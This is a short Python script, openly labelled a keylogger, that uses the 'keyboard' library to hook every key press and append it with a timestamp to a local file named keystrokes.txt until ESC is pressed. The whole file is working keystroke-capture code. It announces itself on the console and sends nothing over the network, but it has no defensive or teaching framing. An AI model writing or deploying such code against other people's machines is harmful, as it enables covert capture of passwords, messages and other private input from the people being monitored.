import keyboard
import datetime
import os

# Define the log file path
LOG_FILE = "keystrokes.txt"

def log_keystroke(event):
    # Get the key name
    key = event.name
    
    # Handle special keys
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "[ENTER]\n"
        elif key == "backspace":
            key = "[BACKSPACE]"
        else:
            key = f"[{key.upper()}]"
    
    # Get current timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Write to log file
    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp}: {key}\n")

def main():
    print("Keylogger started. Press ESC to stop.")
    
    # Ensure the log file exists
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write("Keylogger Log\n")
    
    # Hook the keyboard event
    keyboard.on_press(log_keystroke)
    
    # Keep the program running until ESC is pressed
    keyboard.wait("esc")
    
    print("Keylogger stopped.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgram terminated.")
    except Exception as e:
        print(f"An error occurred: {e}")